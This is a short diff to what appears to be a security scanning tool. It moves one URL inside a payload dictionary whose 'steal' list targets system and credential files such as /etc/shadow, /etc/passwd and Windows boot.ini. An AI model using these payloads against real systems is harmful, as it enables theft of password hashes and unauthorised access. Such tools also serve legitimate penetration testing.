@@ -71,12 +71,12 @@ def append_payloads(options):
     payloads = {
         'D': [  # detect
                 'file:///dev/random',
+                'http://codepad.org/kfHNgnZj/raw.c',
         ],
         'S': [  # steal
                 'file:///etc/shadow',
                 'file:///etc/passwd',
                 'file:///c:/boot.ini',
-                'http://codepad.org/kfHNgnZj/raw.c',
                 'file:///c:/winnt/win.ini',
         ]}
 
